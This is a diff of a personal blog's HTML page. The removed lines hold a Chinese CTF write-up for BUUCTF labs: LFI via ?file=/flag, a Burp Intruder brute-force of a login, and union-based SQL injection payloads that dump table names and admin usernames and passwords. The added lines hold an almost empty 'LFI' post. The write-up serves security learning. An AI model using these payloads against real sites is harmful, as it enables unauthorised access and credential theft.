@@ -16,41 +16,22 @@
   <meta name="author" content="TEhS">
   <meta name="keywords" content="">
   
-    <meta name="description" content="LFI COURSE 1  if(isset($_GET[&#39;file&#39;])) &amp;#123; ... &amp;#125;：这是一个条件语句，用于检查是否存在名为 ‘file’ 的 GET 参数。如果存在，代码块内的内容将被执行。 $str &#x3D; $_GET[&#39;file&#39;];：将名为 ‘file’ 的 GET 参数的值存储在变量 $str 中。 include $_GET[&amp;#">
+    <meta name="description" content="LFI文件传输漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BUUCTFWriteUp1">
-<meta property="og:url" content="http://example.com/2023/09/02/BUUCTFWriteUp1/index.html">
+<meta property="og:title" content="LFI">
+<meta property="og:url" content="http://example.com/2023/09/05/LFI/index.html">
 <meta property="og:site_name" content="TEhS">
-<meta property="og:description" content="LFI COURSE 1  if(isset($_GET[&#39;file&#39;])) &amp;#123; ... &amp;#125;：这是一个条件语句，用于检查是否存在名为 ‘file’ 的 GET 参数。如果存在，代码块内的内容将被执行。 $str &#x3D; $_GET[&#39;file&#39;];：将名为 ‘file’ 的 GET 参数的值存储在变量 $str 中。 include $_GET[&amp;#">
+<meta property="og:description" content="LFI文件传输漏洞">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902093905518.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902094347903.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902102422665.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902102530889.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902103129156.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902103004685.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902103201354.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902103408791.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902150719714.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902163825700.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902163842513.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902170242985.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902170731553.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902171015321.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902171132043.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902171445924.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902171958351.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902172038494.png">
-<meta property="article:published_time" content="2023-09-02T01:19:45.000Z">
-<meta property="article:modified_time" content="2023-09-05T02:43:57.110Z">
+<meta property="article:published_time" content="2023-09-05T02:50:19.000Z">
+<meta property="article:modified_time" content="2023-09-05T02:58:17.180Z">
 <meta property="article:author" content="TEhS">
-<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="learning">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902093905518.png">
   
   
   
-  <title>BUUCTFWriteUp1 - TEhS</title>
+  <title>LFI - TEhS</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -216,7 +197,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="BUUCTFWriteUp1"></span>
+            <span id="subtitle" data-typed-text="LFI"></span>
           
         </div>
 
@@ -227,8 +208,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-02 09:19" pubdate>
-          2023年9月2日 上午
+        <time datetime="2023-09-05 10:50" pubdate>
+          2023年9月5日 上午
         </time>
       </span>
     
@@ -239,7 +220,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          9 字
         
       </span>
     
@@ -250,7 +231,7 @@
         
         
         
-          14 分钟
+          1 分钟
         
       </span>
     
@@ -287,74 +268,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">BUUCTFWriteUp1</h1>
+            <h1 id="seo-header">LFI</h1>
             
             
               <div class="markdown-body">
                 
-                <p><strong>LFI COURSE 1</strong></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902093905518.png" srcset="/img/loading.gif" lazyload alt="image-20230902093905518"></p>
-<p><code>if(isset($_GET[&#39;file&#39;])) &#123; ... &#125;</code>：这是一个条件语句，用于检查是否存在名为 ‘file’ 的 GET 参数。如果存在，代码块内的内容将被执行。</p>
-<p><code>$str = $_GET[&#39;file&#39;];</code>：将名为 ‘file’ 的 GET 参数的值存储在变量 <code>$str</code> 中。</p>
-<p><code>include $_GET[&#39;file&#39;];</code>：这行代码尝试包含一个文件，文件名由 GET 参数 ‘file’ 的值指定</p>
-<p>用户可以通过GET参数来指定要包含的文件，include可能存在LFI（文件包含漏洞攻击）</p>
-<p>尝试?file&#x3D;&#x2F;flag   ?file&#x3D;&#x2F;flag.txt ?file&#x3D;&#x2F;flag.php </p>
-<p>?file&#x3D;&#x2F;flag可以直接得到flag</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902094347903.png" srcset="/img/loading.gif" lazyload alt="image-20230902094347903"></p>
-<p><strong>BRUTE 1</strong></p>
-<p>进入靶机后以下界面：</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102422665.png" srcset="/img/loading.gif" lazyload alt="image-20230902102422665"></p>
-<p>随意尝试组合用户名为123，password为123，返回“用户名错误”</p>
-<p>用burpsuite抓包可以得到以下信息</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102530889.png" srcset="/img/loading.gif" lazyload alt="image-20230902102530889"></p>
-<p>根据题目意思Brute为野蛮的，推测为暴力破解，则选择send to Intruder，因为返回为“用户名错误”而不是“用户名或密码错误”，在尝试时，推测可以先确定用户名，再确定密码，不需要两边同时爆破</p>
-<p>所以构造：</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103129156.png" srcset="/img/loading.gif" lazyload alt="image-20230902103129156"></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103004685.png" srcset="/img/loading.gif" lazyload alt="image-20230902103004685"></p>
-<p>用户名字典和密码字典为网上下载，导入后选择Simple list，开始爆破</p>
-<p>当用户名为admin时：</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103201354.png" srcset="/img/loading.gif" lazyload alt="image-20230902103201354"></p>
-<p>所以修改payload：</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103408791.png" srcset="/img/loading.gif" lazyload alt="image-20230902103408791"></p>
-<p>得到正确的值6490</p>
-<p>至此得到用户名为admin，密码为6490，输入可以得到flag</p>
-<p><strong>SQL COURSE 1</strong></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902150719714.png" srcset="/img/loading.gif" lazyload alt="image-20230902150719714"></p>
-<p>随便点击</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163825700.png" srcset="/img/loading.gif" lazyload alt="image-20230902163825700"></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163842513.png" srcset="/img/loading.gif" lazyload alt="image-20230902163842513"></p>
-<p>看到在访问backend&#x2F;content_detail.php?id&#x3D;1处，可能存在sql注入点，扔到HackBar中开始测试</p>
-<p>分别尝试<code>?id=1 and 1=1</code>和 <code>?id=1 and 1=2</code> 发现第一条有回显，第二条没有，判断为数字型注入</p>
-<p>判断or是否被过滤：</p>
-<p><code>?id=1 or 1=1</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170242985.png" srcset="/img/loading.gif" lazyload alt="image-20230902170242985"></p>
-<p>判断列数：</p>
-<p><code>?id=1 order by 1</code> 有回显</p>
-<p><code>?id=1 order by 2</code>有回显</p>
-<p><code>?id=1 order by 3</code>无回显</p>
-<p>所以表有两列</p>
-<p>确定字段的显示顺序</p>
-<p><code>?id=-1 union select 1,2</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170731553.png" srcset="/img/loading.gif" lazyload alt="image-20230902170731553"></p>
-<p>爆破数据库：</p>
-<p><code>?id=-1 union select database(), database()</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171015321.png" srcset="/img/loading.gif" lazyload alt="image-20230902171015321"></p>
-<p>根据获得的数据库的名称，获取数据表的信息</p>
-<p><code>?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;)</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171132043.png" srcset="/img/loading.gif" lazyload alt="image-20230902171132043"></p>
-<p><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;</code>这部分会连接数据库中的所有表格名称，并以逗号分隔的形式返回。于是得到了表名信息admin, contents</p>
-<p>使用admin表，获取字段信息</p>
-<p><code>?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;news&#39; and table_name=&#39;admin&#39;)</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171445924.png" srcset="/img/loading.gif" lazyload alt="image-20230902171445924"></p>
-<p>此处union select后的1作为占位符，使得结果可以对齐，括号中的查询语句可以获得news库admin表中的所有列名</p>
-<p>获取username</p>
-<p><code>?id=-1 union select 1,(select group_concat(username) from admin)</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171958351.png" srcset="/img/loading.gif" lazyload alt="image-20230902171958351"></p>
-<p>获取密码</p>
-<p><code>?id=-1 union select 1,(select group_concat(password) from admin)</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902172038494.png" srcset="/img/loading.gif" lazyload alt="image-20230902172038494"></p>
-<p>根据得到的信息即可得到flag</p>
-
+                <h2 id="LFI文件传输漏洞"><a href="#LFI文件传输漏洞" class="headerlink" title="LFI文件传输漏洞"></a>LFI文件传输漏洞</h2>
                 
               </div>
             
@@ -362,32 +281,11 @@
             <div>
               <div class="post-metas my-3">
   
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/Basic/" class="category-chain-item">Basic</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
   
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+        <a href="/tags/learning/" class="print-no-link">#learning</a>
       
     </div>
   
@@ -399,8 +297,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>BUUCTFWriteUp1</div>
-      <div>http://example.com/2023/09/02/BUUCTFWriteUp1/</div>
+      <div>LFI</div>
+      <div>http://example.com/2023/09/05/LFI/</div>
     </div>
     <div class="license-meta">
       
@@ -412,7 +310,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年9月2日</div>
+          <div>2023年9月5日</div>
         </div>
       
       
@@ -444,9 +342,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/09/05/LFI/" title="LFI">
+                      <a href="/2023/09/05/Upload-labs/" title="Upload_labs1">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">LFI</span>
+                        <span class="hidden-mobile">Upload_labs1</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -454,8 +352,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/07/27/ReadPaper2/" title="ReadPaper2">
-                        <span class="hidden-mobile">ReadPaper2</span>
+                      <a href="/2023/09/02/BUUCTFWriteUp1/" title="BUUCTFWriteUp1">
+                        <span class="hidden-mobile">BUUCTFWriteUp1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
